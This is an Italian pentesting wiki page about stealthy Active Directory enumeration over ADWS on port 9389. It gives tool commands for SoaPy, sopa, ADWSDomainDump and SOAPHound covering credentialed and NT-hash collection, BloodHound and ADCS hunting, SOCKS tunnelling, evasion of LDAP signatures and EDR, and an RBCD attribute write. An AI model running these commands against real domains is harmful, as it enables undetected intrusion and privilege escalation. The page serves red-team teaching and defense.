# Enumeration di Active Directory Web Services (ADWS) e raccolta stealth

{{#include ../../banners/hacktricks-training.md}}

## Cos'è ADWS?

Active Directory Web Services (ADWS) è **abilitato per impostazione predefinita su ogni Domain Controller da Windows Server 2008 R2** e ascolta sulla porta TCP **9389**. Nonostante il nome, **non viene usato HTTP**. Il servizio espone invece dati in stile LDAP attraverso uno stack di protocolli di framing proprietari .NET:<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Poiché il traffico è incapsulato in questi frame SOAP binari e viaggia su una porta non comune, **l'enumerazione tramite ADWS ha molte meno probabilità di essere ispezionata, filtrata o rilevata tramite firme rispetto al traffico LDAP/389 e 636 classico**. Per gli operatori questo significa:<sup>[[1]](#references)[[7]](#references)</sup>

* Recon più stealth: i Blue Team spesso si concentrano sulle query LDAP.
* Possibilità di raccogliere dati da **host non Windows (Linux, macOS)** tramite tunnelling della porta 9389/TCP attraverso un proxy SOCKS.
* Gli stessi dati che si otterrebbero tramite LDAP (utenti, gruppi, ACL, schema, ecc.) e la possibilità di eseguire **scritture** (ad es. `msDs-AllowedToActOnBehalfOfOtherIdentity` per **RBCD**).

Le interazioni ADWS sono implementate tramite WS-Enumeration: ogni query inizia con un messaggio `Enumerate` che definisce il filtro/attributi LDAP e restituisce un GUID `EnumerationContext`, seguito da uno o più messaggi `Pull` che trasmettono risultati fino al limite di risultati definito dal server.<sup>[[7]](#references)</sup> I contesti scadono dopo circa 30 minuti, quindi gli strumenti devono suddividere i risultati in pagine oppure separare i filtri (query per prefisso per CN) per evitare di perdere lo stato.<sup>[[8]](#references)</sup> Quando si richiedono descrittori di sicurezza, specificare il controllo `LDAP_SERVER_SD_FLAGS_OID` per omettere le SACL; altrimenti ADWS rimuove semplicemente l'attributo `nTSecurityDescriptor` dalla risposta SOAP.

> NOTA: ADWS è usato anche da molti strumenti RSAT GUI/PowerShell, quindi il traffico può confondersi con attività di amministrazione legittime.

## SoaPy – Client Python nativo

[SoaPy](https://github.com/logangoins/soapy) è una **reimplementazione completa dello stack di protocolli ADWS in puro Python**. Crea i frame NBFX/NBFSE/NNS/NMF byte per byte, consentendo la raccolta da sistemi Unix-like senza ricorrere al runtime .NET.<sup>[[1]](#references)[[2]](#references)</sup>

### Funzionalità principali

* Supporta il **proxying tramite SOCKS** (utile dagli impianti C2).
* Filtri di ricerca dettagliati, identici a LDAP `-q '(objectClass=user)'`.
* Operazioni di **scrittura** opzionali (`--set` / `--delete`).
* **Modalità di output BOFHound** per l'importazione diretta in BloodHound.<sup>[[3]](#references)</sup>
* Flag `--parse` per rendere più leggibili timestamp e `userAccountControl` quando serve una lettura facilitata.<sup>[[2]](#references)</sup>

### Flag per la raccolta mirata e operazioni di scrittura

SoaPy include opzioni selezionate che replicano le attività LDAP di hunting più comuni tramite ADWS: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, oltre alle opzioni grezze `--query` / `--filter` per query personalizzate. È possibile abbinarle a primitive di scrittura come `--rbcd <source>` (imposta `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (preparazione SPN per Kerberoasting mirato) e `--asrep` (imposta `DONT_REQ_PREAUTH` in `userAccountControl`).<sup>[[2]](#references)</sup>

Esempio di ricerca mirata degli SPN che restituisce solo `samAccountName` e `servicePrincipalName`:

```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
      --spns -f samAccountName,servicePrincipalName --parse
```

Usa lo stesso host/le stesse credenziali per weaponizzare subito i risultati: esegui il dump degli oggetti compatibili con RBCD con `--rbcds`, quindi applica `--rbcd 'WEBSRV01$' --account 'FILE01$'` per predisporre una catena di Resource-Based Constrained Delegation (vedi [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) per la procedura completa di abuso).

### Installazione (host dell'operatore)

```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```

## ADWSDomainDump – LDAPDomainDump over ADWS (Linux/Windows)

* Fork di `ldapdomaindump` che sostituisce le query LDAP con chiamate ADWS sulla porta TCP/9389 per ridurre i rilevamenti basati sulle firme LDAP.
* Esegue un controllo iniziale della raggiungibilità della porta 9389, a meno che non venga passato `--force` (salta il controllo se le scansioni delle porte generano troppo rumore o vengono filtrate).
* Testato con Microsoft Defender for Endpoint e CrowdStrike Falcon, con bypass riuscito secondo il README.<sup>[[4]](#references)</sup>

### Installazione

```bash
pipx install .
```

### Utilizzo

```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```

L'output tipico registra il controllo di raggiungibilità sulla porta 9389, il bind ADWS e l'inizio/la fine del dump:

```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

## Sopa - Un client pratico per ADWS in Golang

Come soapy, [sopa](https://github.com/Macmod/sopa) implementa lo stack del protocollo ADWS (MS-NNS + MC-NMF + SOAP) in Golang, esponendo flag da riga di comando per eseguire chiamate ADWS come:<sup>[[5]](#references)</sup>

* **Ricerca e recupero di oggetti** - `query` / `get`
* **Ciclo di vita degli oggetti** - `create [user|computer|group|ou|container|custom]` e `delete`
* **Modifica degli attributi** - `attr [add|replace|delete]`
* **Gestione degli account** - `set-password` / `change-password`
* e altri, come `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]`, ecc.

### Aspetti salienti della mappatura del protocollo

* Le ricerche in stile LDAP vengono eseguite tramite **WS-Enumeration** (`Enumerate` + `Pull`), con proiezione degli attributi, controllo dell'ambito (Base/OneLevel/Subtree) e paginazione.
* Il recupero di un singolo oggetto usa **WS-Transfer** `Get`; le modifiche agli attributi usano `Put`; le eliminazioni usano `Delete`.
* La creazione di oggetti integrata usa **WS-Transfer ResourceFactory**; per gli oggetti personalizzati si usa una **IMDA AddRequest** basata su template YAML.
* Le operazioni sulle password sono azioni **MS-ADCAP** (`SetPassword`, `ChangePassword`).<sup>[[5]](#references)</sup>

### Individuazione di metadati senza autenticazione (mex)

ADWS espone WS-MetadataExchange senza credenziali: un modo rapido per verificare l'esposizione prima di autenticarsi:<sup>[[5]](#references)</sup>

```bash
sopa mex --dc <DC>
```

### Note sulla scoperta DNS/DC e sul targeting di Kerberos

Sopa può individuare i DC tramite SRV se si omette `--dc` e si specifica `--domain`. Esegue le query in questo ordine e usa la destinazione con la priorità più alta:<sup>[[5]](#references)</sup>

```text
_ldap._tcp.<domain>
_kerberos._tcp.<domain>
```

Dal punto di vista operativo, preferisci un resolver controllato dal DC per evitare errori negli ambienti segmentati:

* Usa `--dns <DC-IP>` affinché **tutte** le query SRV/PTR/forward passino dal DNS del DC.
* Usa `--dns-tcp` quando UDP è bloccato o le risposte SRV sono di grandi dimensioni.
* Se Kerberos è abilitato e `--dc` è un IP, sopa esegue una query **PTR inversa** per ottenere un FQDN e indirizzare correttamente SPN/KDC. Se Kerberos non viene usato, non viene eseguita alcuna query PTR.

Esempio (IP + Kerberos, DNS forzato tramite il DC):

```bash
sopa info version --dc 192.168.1.10 --dns 192.168.1.10 -k --domain corp.local -u user -p pass
```

### Opzioni per il materiale di autenticazione

Oltre alle password in chiaro, sopa supporta **hash NT**, **chiavi AES Kerberos**, **ccache** e **certificati PKINIT** (PFX o PEM) per l’autenticazione ADWS. Kerberos viene utilizzato implicitamente quando si usano `--aes-key`, `-c` (ccache) o le opzioni basate su certificati.<sup>[[5]](#references)</sup>

```bash
# NT hash
sopa --dc <DC> -d <DOMAIN> -u <USER> -H <NT_HASH> query --filter '(objectClass=user)'

# Kerberos ccache
sopa --dc <DC> -d <DOMAIN> -u <USER> -c <CCACHE> info domain
```

### Creazione di oggetti personalizzati tramite template

Per classi di oggetti arbitrarie, il comando `create custom` utilizza un template YAML che corrisponde a una richiesta IMDA `AddRequest`:<sup>[[5]](#references)</sup>

* `parentDN` e `rdn` definiscono il contenitore e il DN relativo.
* `attributes[].name` supporta `cn` o `addata:cn` con namespace.
* `attributes[].type` accetta `string|int|bool|base64|hex` oppure `xsd:*` espliciti.
* **Non** includere `ad:relativeDistinguishedName` o `ad:container-hierarchy-parent`: sopa li inserisce automaticamente.
* I valori `hex` vengono convertiti in `xsd:base64Binary`; usa `value: ""` per impostare stringhe vuote.

## SOAPHound – Raccolta ADWS ad alto volume (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) è un collector .NET che mantiene tutte le interazioni LDAP all'interno di ADWS e genera JSON compatibile con BloodHound v4. Crea una cache completa di `objectSid`, `objectGUID`, `distinguishedName` e `objectClass` una sola volta (`--buildcache`), poi la riutilizza per le passate ad alto volume `--bhdump`, `--certdump` (ADCS) o `--dnsdump` (DNS integrato in AD), così che solo ~35 attributi critici lascino il DC. AutoSplit (`--autosplit --threshold <N>`) suddivide automaticamente le query in base al prefisso CN per rimanere al di sotto del timeout di 30 minuti di EnumerationContext nelle foreste di grandi dimensioni.<sup>[[8]](#references)</sup>

Workflow tipico su una VM operatore aggiunta al dominio:

```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
              --autosplit --threshold 1200 --nolaps \
              -o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```

Gli slot JSON esportati si integrano direttamente nei workflow di SharpHound/BloodHound: consulta [la metodologia BloodHound](bloodhound.md) per idee sulla creazione di grafi a valle. AutoSplit rende SOAPHound resiliente nelle forest con milioni di oggetti, mantenendo basso il numero di query rispetto agli snapshot in stile ADExplorer.

## Workflow di raccolta AD stealth

Il workflow seguente mostra come enumerare **oggetti di dominio e ADCS** tramite ADWS, convertirli in JSON per BloodHound e cercare percorsi di attacco basati su certificati, tutto da Linux:

1. **Crea un tunnel per la porta 9389/TCP** dalla rete target alla tua macchina (ad es. tramite Chisel, Meterpreter, port forwarding dinamico SSH, ecc.). Esporta `export HTTPS_PROXY=socks5://127.0.0.1:1080` oppure usa `--proxyHost/--proxyPort` di SoaPy.

2. **Raccogli l'oggetto del dominio radice:**

```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
      -q '(objectClass=domain)' \
      | tee data/domain.log
```

3. **Raccogli gli oggetti relativi ad ADCS dalla Configuration NC:**

```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
      -dn 'CN=Configuration,DC=ludus,DC=domain' \
      -q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
           (objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
      | tee data/adcs.log
```

4. **Converti in BloodHound:**

```bash
bofhound -i data --zip   # produces BloodHound.zip
```

5. **Carica lo ZIP** nell’interfaccia GUI di BloodHound ed esegui query cypher come `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` per individuare percorsi di escalation tramite certificati (ESC1, ESC8, ecc.).

### Scrittura di `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)

```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
      --set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
      msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```

Combinalo con `s4u2proxy`/`Rubeus /getticket` per una chain completa di **Resource-Based Constrained Delegation** (vedi [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

## Riepilogo degli strumenti

| Scopo | Strumento | Note |
|---------|------|-------|
| Enumerazione ADWS | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, lettura/scrittura |
| Dump ADWS ad alto volume | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, modalità BH/ADCS/DNS |
| Importazione in BloodHound | [BOFHound](https://github.com/bohops/BOFHound) | Converte i log di SoaPy/ldapsearch |
| Compromissione dei certificati | [Certipy](https://github.com/ly4k/Certipy) | Può essere instradato tramite lo stesso SOCKS |
| Enumerazione ADWS e modifiche agli oggetti | [sopa](https://github.com/Macmod/sopa) | Client generico per interagire con gli endpoint ADWS noti: consente l'enumerazione, la creazione di oggetti, la modifica degli attributi e il cambio delle password |

## References

- [1] [SpecterOps – Assicurati di usare SOAP(y) – Guida per gli operatori alla raccolta stealth di dati AD tramite ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
- [2] [SoaPy su GitHub](https://github.com/logangoins/soapy)
- [3] [BOFHound su GitHub](https://github.com/bohops/BOFHound)
- [4] [ADWSDomainDump su GitHub](https://github.com/mverschu/adwsdomaindump)
- [5] [Sopa su GitHub](https://github.com/Macmod/sopa)
- [6] [Microsoft – Specifiche MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
- [7] [IBM X-Force Red – Enumerazione stealth degli ambienti Active Directory tramite ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
- [8] [FalconForce – Lo strumento SOAPHound per raccogliere dati Active Directory tramite ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)
{{#include ../../banners/hacktricks-training.md}}
